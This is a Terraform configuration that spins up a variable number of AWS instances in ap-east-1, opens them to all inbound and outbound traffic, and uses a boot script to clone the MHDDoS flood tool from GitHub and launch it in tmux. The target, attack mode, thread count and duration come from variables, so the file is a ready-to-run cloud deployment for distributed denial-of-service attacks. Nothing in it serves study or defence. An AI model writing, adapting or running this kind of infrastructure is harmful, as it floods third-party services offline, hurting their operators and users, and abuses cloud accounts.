provider "aws" {
  region = "ap-east-1"
}

resource "random_id" "suffix" {
  byte_length = 4
}

resource "tls_private_key" "pte_ssh" {
  algorithm = "ED25519"
}

resource "aws_key_pair" "pte_key" {
  key_name   = "pte-proxy-key-${random_id.suffix.hex}"
  public_key = tls_private_key.pte_ssh.public_key_openssh
}

resource "aws_security_group" "pte_open_all" {
  name        = "pte-open-all-proxy-${random_id.suffix.hex}"
  description = "Allow all inbound and outbound"

  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
    ipv6_cidr_blocks = ["::/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
    ipv6_cidr_blocks = ["::/0"]
  }
}

resource "aws_instance" "pte_node" {
  count                      = var.node
  ami                        = "ami-01c9cc5554738042c"
  instance_type              = "t4g.nano"
  vpc_security_group_ids     = [aws_security_group.pte_open_all.id]
  key_name                   = aws_key_pair.pte_key.key_name

  root_block_device {
    volume_type = "gp3"
    volume_size = 18
  }

  tags = {
    Name = "MHDDoS"
  }

    user_data                   = <<EOF
#!/bin/bash
sudo apt-get update
sudo sleep 2
sudo apt-get install -y ca-certificates
sudo apt-get install -y curl
sudo apt-get install -y wget
sudo apt-get install -y libcurl4
sudo apt-get install -y libssl-dev
sudo apt-get install -y python3
sudo apt-get install -y python3-pip
sudo apt-get install -y make
sudo apt-get install -y cmake
sudo apt-get install -y automake
sudo apt-get install -y autoconf
sudo apt-get install -y m4
sudo apt-get install -y git
sudo apt-get install -y build-essential
sudo apt-get install -y unzip
sudo apt-get install -y tmux

sudo echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
sudo echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
sudo sysctl -p

sudo git clone https://github.com/MatrixTM/PyRoxy.git
sudo pip3 install /PyRoxy --break-system-packages
sudo pip3 install cloudscraper --break-system-packages
sudo pip3 install dnspython --break-system-packages
sudo pip3 install icmplib --break-system-packages
sudo apt install -y python3-impacket
sudo pip3 install psutil --break-system-packages
sudo git clone https://github.com/MatrixTM/MHDDoS.git
sudo touch /MHDDoS/files/proxies/socks5.txt
sudo mkdir -p /files/proxies
sudo touch /files/proxies/socks5.txt
sudo tmux new-session -s ds -d
sudo tmux send-keys -t ds:0 'ulimit -u65535;ulimit -n65535;cd /MHDDoS;python3 start.py ${var.ddos_mode} ${var.ddos_target} 5 ${var.ddos_threads} socks5.txt 200 ${var.ddos_time} true' Enter
EOF

}

resource "local_file" "pte_private_key" {
  filename        = "./pte-proxy-key.pem"
  content         = tls_private_key.pte_ssh.private_key_openssh
  file_permission = "0600"
}